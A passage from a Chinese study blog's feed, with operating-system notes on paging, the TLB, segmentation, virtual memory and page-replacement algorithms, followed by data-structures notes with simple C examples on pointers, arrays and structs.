具有快表的地址变换机构</h5><p>是基本地址变换机构的改进版本。</p><p>局部性原理：</p><ul><li>时间局部性：如果执行了程序中的某条指令，那么不久后这条指令很有可能再次执行；如果某个数据被访问过，不久之后该数据很可能再次被访问。(因为程序中存在大量的循环)</li><li>空间局部性：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也很有可能被访问。(因为很多数据在内存中都是连续存放的)</li></ul><p>基本地址变换机构中，每次要访问一个逻辑地址，都需要查询内存中的页表。由于局部性原理，可能连续很多次查到的都是同一个页表项。既然如此，能否利用这个特性减少访问页表的次数呢？</p><p>快表，又称联想寄存器(TLB)，是一种访问速度比内存快很多的高速缓冲存储器，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。</p><img src="/posts/d04bd5bc/3.3.5.1.2.1.png" class="" title="快表机制"><img src="/posts/d04bd5bc/3.3.5.1.2.2.png" class="" title="快表机制"><h5 id="3-3-5-1-3-两级页表"><a href="#3-3-5-1-3-两级页表" class="headerlink" title="3.3.5.1.3 两级页表"></a>3.3.5.1.3 两级页表</h5><p>单级页表存在的问题：①页表必须连续存放，因此当页表很大时，需要占用很多个连续的页框；②没有必要让整个页表常驻内存，因为进程在一段时间内可能只需要访问几个特定的页面。</p><p>解决问题一：</p><img src="/posts/d04bd5bc/3.3.5.1.3.1.png" class="" title="问题一"><img src="/posts/d04bd5bc/3.3.5.1.3.2.png" class="" title="问题一"><img src="/posts/d04bd5bc/3.3.5.1.3.3.png" class="" title="问题一"><p>解决问题二：</p><img src="/posts/d04bd5bc/3.3.5.1.3.4.png" class="" title="问题二"><img src="/posts/d04bd5bc/3.3.5.1.3.5.png" class="" title="小细节"><h4 id="3-3-5-2-基本分段存储管理"><a href="#3-3-5-2-基本分段存储管理" class="headerlink" title="3.3.5.2 基本分段存储管理"></a>3.3.5.2 基本分段存储管理</h4><p>进程的地址空间：按照程序自身的逻辑关系划分为若干个段，每个段都有一个段名(在低级语言中，程序员使用段名来编程)，每段从0开始编址。</p><p>内存分配规则：以段为单位进行分配，每个段在内存中占据连续空间，但各段之间可以不相邻。</p><img src="/posts/d04bd5bc/3.3.5.2.1.png" class="" title="基本分段存储管理"><img src="/posts/d04bd5bc/3.3.5.2.2.png" class="" title="基本分段存储管理"><img src="/posts/d04bd5bc/3.3.5.2.3.png" class="" title="基本分段存储管理"><img src="/posts/d04bd5bc/3.3.5.2.4.png" class="" title="基本分段存储管理"><h4 id="3-3-5-3-分段、分页管理的对比"><a href="#3-3-5-3-分段、分页管理的对比" class="headerlink" title="3.3.5.3 分段、分页管理的对比"></a>3.3.5.3 分段、分页管理的对比</h4><p>页是信息的物理单位。分页的主要目的是为了实现离散分配，提供内存利用率。分页仅仅是系统管理上的需要，完全是系统行为，对用户是不可见的。</p><p>段是信息的逻辑单位。分段的主要目的是更好地满足用户需求。一个段通常包含着一组属于一个逻辑模块的信息。分段对用户是可见的，用户编程时需要显式地给出段名。</p><p>页的大小固定且由系统决定。段的长度却不固定，决定于用户编写的程序。</p><p>分页的用户进程地址空间是一维的，程序员只需给出一个记忆符即可表示一个地址。分段的用户进程地址空间是二维的，程序员在标识一个地址时，既要给出段名，也要给出段内地址。</p><img src="/posts/d04bd5bc/3.3.5.3.1.png" class="" title="分段分页管理的对比"><img src="/posts/d04bd5bc/3.3.5.3.2.png" class="" title="分段分页管理的对比"><p>分段存储中也可以引入快表机制。</p><h4 id="3-3-5-4-段页式存储管理"><a href="#3-3-5-4-段页式存储管理" class="headerlink" title="3.3.5.4 段页式存储管理"></a>3.3.5.4 段页式存储管理</h4><h5 id="3-3-5-4-1-分页、分段的优缺点"><a href="#3-3-5-4-1-分页、分段的优缺点" class="headerlink" title="3.3.5.4.1 分页、分段的优缺点"></a>3.3.5.4.1 分页、分段的优缺点</h5><div class="table-container"><table><thead><tr><th></th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>分页管理</td><td>内存空间利用率高，不会产生外部碎片，只会有少量的页内碎片</td><td>不方便按照逻辑模块实现信息的共享和保护</td></tr><tr><td>分段管理</td><td>很方便按照逻辑模块实现信息的共享和保护</td><td>如果段长过大，为其分配很大的连续空间会很不方便。另外，段式管理会产生外部碎片</td></tr></tbody></table></div><h5 id="3-3-5-4-2-段页式管理"><a href="#3-3-5-4-2-段页式管理" class="headerlink" title="3.3.5.4.2 段页式管理"></a>3.3.5.4.2 段页式管理</h5><img src="/posts/d04bd5bc/3.3.5.4.2.png" class="" title="段页式管理"><img src="/posts/d04bd5bc/3.3.5.4.2.1.png" class="" title="段页式管理"><img src="/posts/d04bd5bc/3.3.5.4.2.2.png" class="" title="段页式管理"><h3 id="3-3-6-虚拟内存"><a href="#3-3-6-虚拟内存" class="headerlink" title="3.3.6 虚拟内存"></a>3.3.6 虚拟内存</h3><img src="/posts/d04bd5bc/3.3.6.1.png" class="" title="传统管理方式的特征"><p>局部性原理：(看3.3.5.1.2)</p><p>高速缓冲技术的思想：将近期会频繁访问到的数据放到更高速的存储器中，暂时用不到的数据放在更低速存储器中。快表机构就是将近期常访问的页表项副本放到更高速的联想寄存器中。</p><img src="/posts/d04bd5bc/3.3.6.2.png" class="" title="虚拟内存的定义和特征"><p>虚拟内存有以下三个主要特征：</p><ul><li>多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调入内存</li><li>对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入、换出</li><li>虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量</li></ul><img src="/posts/d04bd5bc/3.3.6.3.png" class="" title="实现虚拟内存技术"><h4 id="3-3-6-1-请求分页管理方式"><a href="#3-3-6-1-请求分页管理方式" class="headerlink" title="3.3.6.1 请求分页管理方式"></a>3.3.6.1 请求分页管理方式</h4><img src="/posts/d04bd5bc/3.3.6.4.png" class="" title="请求分页管理方式"><img src="/posts/d04bd5bc/3.3.6.5.png" class="" title="缺页中断"><p>缺页中断是因为当前执行的指令想要访问的目标页面未调入内存而产生的，因此属于内中断。</p><p>一条指令在执行期间，可能产生多次缺页中断。(如：copy A to B，即将逻辑地址A中的数据复制到逻辑地址B，而A、B属于不同的页面，则有可能产生两次中断)</p><img src="/posts/d04bd5bc/3.3.6.6.png" class="" title="请求分页地址变换机构"><img src="/posts/d04bd5bc/3.3.6.7.png" class="" title="请求分页地址变换机构"><h4 id="3-3-6-2-页面置换算法"><a href="#3-3-6-2-页面置换算法" class="headerlink" title="3.3.6.2 页面置换算法"></a>3.3.6.2 页面置换算法</h4><img src="/posts/d04bd5bc/3.3.6.8.png" class="" title="页面置换算法"><h5 id="3-3-6-2-1-最佳置换算法-OPT"><a href="#3-3-6-2-1-最佳置换算法-OPT" class="headerlink" title="3.3.6.2.1 最佳置换算法(OPT)"></a>3.3.6.2.1 最佳置换算法(OPT)</h5><img src="/posts/d04bd5bc/3.3.6.9.png" class="" title="最佳置换算法"><p>最佳置换算法可以保证最低的缺页率，但实际上只有在进程执行的过程中才能知道接下来会访问到的是哪个页面。操作系统无法提前预判页面访问序列。因此，最佳置换算法是无法实现的。</p><h5 id="3-3-6-2-2-先进先出置换算法-FIFO"><a href="#3-3-6-2-2-先进先出置换算法-FIFO" class="headerlink" title="3.3.6.2.2 先进先出置换算法(FIFO)"></a>3.3.6.2.2 先进先出置换算法(FIFO)</h5><img src="/posts/d04bd5bc/3.3.6.10.png" class="" title="先进先出置换算法"><h5 id="3-3-6-2-3-最近最久未使用置换算法-LRU"><a href="#3-3-6-2-3-最近最久未使用置换算法-LRU" class="headerlink" title="3.3.6.2.3 最近最久未使用置换算法(LRU)"></a>3.3.6.2.3 最近最久未使用置换算法(LRU)</h5><img src="/posts/d04bd5bc/3.3.6.11.png" class="" title="最近最久未使用置换算法"><h5 id="3-3-6-2-4-时钟置换算法-CLOCK"><a href="#3-3-6-2-4-时钟置换算法-CLOCK" class="headerlink" title="3.3.6.2.4 时钟置换算法(CLOCK)"></a>3.3.6.2.4 时钟置换算法(CLOCK)</h5><img src="/posts/d04bd5bc/3.3.6.12.png" class="" title="简单时钟置换算法"><img src="/posts/d04bd5bc/3.3.6.13.png" class="" title="改进型时钟置换算法"><h4 id="3-3-6-3-页面分配策略"><a href="#3-3-6-3-页面分配策略" class="headerlink" title="3.3.6.3 页面分配策略"></a>3.3.6.3 页面分配策略</h4><img src="/posts/d04bd5bc/3.3.6.14.png" class="" title="页面分配策略"><img src="/posts/d04bd5bc/3.3.6.15.png" class="" title="页面分配策略"><img src="/posts/d04bd5bc/3.3.6.16.png" class="" title="页面分配策略"><img src="/posts/d04bd5bc/3.3.6.17.png" class="" title="页面分配策略"><p>抖动(颠簸)现象：刚刚换出的页面马上又要换入内存，刚刚换入的页面马上又要换出外存，这种频繁的页面调度行为称为抖动，或颠簸。产生抖动的主要原因是进程频繁访问的页面数目高于可用的物理块数(分配给进程的物理块不够)。</p><p>为进程分配的物理块太少，会使进程发生抖动现象。为进程分配的物理块太多，又会降低系统整体的并发度，降低某些资源的利用率。为了研究应该为每个进程分配多少个物理块，Denning提出了进程“工作集”的概念。</p><img src="/posts/d04bd5bc/3.3.6.18.png" class="" title="工作集"><h1 id="4-文件"><a href="#4-文件" class="headerlink" title="4. 文件"></a>4. 文件</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个笔记是基于 &lt;a href=&quot;https://www.bilibili.com/video/BV1YE411D7nH?p=1&quot;&gt;王道考研 操作系统&lt;/a&gt; 写的，先试试看合不合适我吧。&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://example.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构</title>
    <link href="http://example.com/posts/79666db.html"/>
    <id>http://example.com/posts/79666db.html</id>
    <published>2022-04-11T13:12:08.297Z</published>
    <updated>2022-04-15T03:10:57.865Z</updated>
    
    <content type="html"><![CDATA[<p>呜呜呜笔试的痛，基础一定要打好啊！要不然就像我一样要把知识重新捡回来了。我大一学数据结构就是跟着郝斌老师学的，非常nice！<a href="https://www.bilibili.com/video/BV11s41167h6?p=1">【郝斌】数据结构入门</a></p><p>记笔记记到一半上来感慨一下，绝了姐妹们！温故而知新，我把之前学的知识串通起来了！</p><span id="more"></span><h1 id="1-预备知识"><a href="#1-预备知识" class="headerlink" title="1. 预备知识"></a>1. 预备知识</h1><p><strong>数据结构定义</strong>： 我们如何把现实中大量而复杂的问题以特定的数据类型和特定的存储结构保存到主存储器(内存)中，以及在此基础上为实现某个功能(比如查找、删除、排序)而执行的相应操作，这个相应的操作也就是算法。</p><p>数据结构 = 个体 + 个体的关系</p><p>算法 = 对存储数据的操作</p><p>程序 = 数据结构 + 算法</p><p><strong>衡量算法的标准</strong>：</p><ol><li>时间复杂度：程序要执行的次数，而非确定时间</li><li>空间复杂度：算法执行过程中所占用的最大内存</li><li>难易程度</li><li>健壮性</li></ol><h2 id="1-1-指针"><a href="#1-1-指针" class="headerlink" title="1.1 指针"></a>1.1 指针</h2><p>地址：内存单元的编号，范围从00000000 — FFFFFFFF（0~4G-1）。</p><p>指针：指针(*p)就是地址，地址就是指针。指针变量(p)是存放内存单元地址的变量。指针的本质是一个操作受限的非负整数。指针不等于指针变量。所有指针变量只占4个字节。</p><p>变量：给地址起了个别名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p;<span class="comment">//p是个指针变量，int *表示p变量只能存储int类型变量的地址</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//j = *p;//*p是野指针，因为没有被初始化</span></span><br><span class="line">    <span class="comment">//p = &amp;ch;//数据类型不一致</span></span><br><span class="line">    p = &amp;j;</span><br><span class="line">    *p = j;<span class="comment">//等价于j = j;</span></span><br><span class="line">    i = *p;</span><br><span class="line">    <span class="type">int</span> *q = &amp;j;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d, j = %d, *p = %d, *q = %d\n&quot;</span>, i, j, *p, *q);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 10, j = 10, *p = 10, *q = 10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.1.jpg" class="" title="指针"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    i = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">9</span>;</span><br><span class="line">    f(i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 9</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> *i)</span></span><br><span class="line">&#123;</span><br><span class="line">    *i = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">9</span>;</span><br><span class="line">    f(&amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 100</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.1.2.jpg" class="" title="指针"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> **q)</span></span><br><span class="line">&#123;</span><br><span class="line">    **q = <span class="number">100</span>;</span><br><span class="line">    *q = (<span class="type">int</span> *)<span class="number">0xFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> *p = &amp;i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, p);<span class="comment">//p变量存的内容以地址的形式输出，也就是打印i的地址</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;, &amp;p);//打印p变量的地址</span></span><br><span class="line">    f(&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d, p = %p\n&quot;</span>, i, p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">0101F86C</span></span><br><span class="line"><span class="comment">i = 100, p = FFFFFFFF</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.1.3.jpg" class="" title="指针"><h2 id="1-2-数组"><a href="#1-2-数组" class="headerlink" title="1.2 数组"></a>1.2 数组</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;<span class="comment">//a[i] == *(a+i) == *(i+a) == i[a]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, a + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, a + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *a + <span class="number">3</span>);<span class="comment">//*a+3 == a[0]+3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">0056FB1C</span></span><br><span class="line"><span class="comment">0056FB20</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.2.1.jpg" class="" title="数组"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show_Array</span><span class="params">(<span class="type">int</span> *p, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    p[<span class="number">2</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    Show_Array(a, <span class="number">5</span>);<span class="comment">//a等价于&amp;a[0],&amp;a[0]本身就是int *类型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">1 2 -1 4 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.2.2.jpg" class="" title="数组"><h2 id="1-3-结构体"><a href="#1-3-结构体" class="headerlink" title="1.3 结构体"></a>1.3 结构体</h2><p>为什么会出现结构体：为了表示一些复杂的数据，而普通的基本类型变量无法满足要求。</p><p><strong>结构体定义</strong>：结构体是用户根据实际需要自己定义的复合数类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span> =</span> &#123;<span class="number">1000</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="number">20</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s %d\n&quot;</span>, st.sid, st.name, st.age);</span><br><span class="line">    st.sid = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">//st.name = &quot;lisi&quot;;//name是个数组指针变量，左右数据类型不一致</span></span><br><span class="line">    <span class="built_in">strcpy</span>(st.name, <span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">    st.age = <span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s %d\n&quot;</span>, st.sid, st.name, st.age);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">1000 zhangsan 20</span></span><br><span class="line"><span class="comment">2000 lisi 21</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span>;</span><span class="comment">//类似于int i;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> * <span class="title">pst</span>;</span><span class="comment">//类似于int *p;</span></span><br><span class="line">    pst = &amp;st;<span class="comment">//类似于p = &amp;i;</span></span><br><span class="line">    pst-&gt;sid = <span class="number">99</span>;<span class="comment">//类似于*p = 99;</span></span><br><span class="line">    <span class="comment">//pst-&gt;sid等价于(*pst).sid等价于st.sid</span></span><br><span class="line">    <span class="comment">//结构体指针变量后是&quot;-&gt;&quot;</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>注意事项：结构体变量不能进行算术运算，但是可以相互赋值；普通结构体变量和结构体指针变量作为函数传参的问题，推荐使用传递结构体指针的方式，这样效率高、节约内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="keyword">struct</span> Student * pst)</span></span><br><span class="line">&#123;</span><br><span class="line">    (*pst).sid = <span class="number">99</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(pst-&gt;name, <span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">    pst-&gt;age = <span class="number">23</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">//这种方式耗内存，耗时间，不推荐</span></span><br><span class="line"><span class="comment">void g(struct Student st)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d %s %d\n&quot;, st.sid, st.name, st.age);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">k</span><span class="params">(<span class="keyword">struct</span> Student * pst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s %d\n&quot;</span>, pst-&gt;sid, pst-&gt;name, pst-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span>;</span></span><br><span class="line">    f(&amp;st);</span><br><span class="line">    <span class="comment">//printf(&quot;%d %s %d\n&quot;, st.sid, st.name, st.age);</span></span><br><span class="line">    <span class="comment">//g(st);</span></span><br><span class="line">    k(&amp;st);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-4-动态内存分配"><a href="#1-4-动态内存分配" class="headerlink" title="1.4 动态内存分配"></a>1.4 动态内存分配</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span 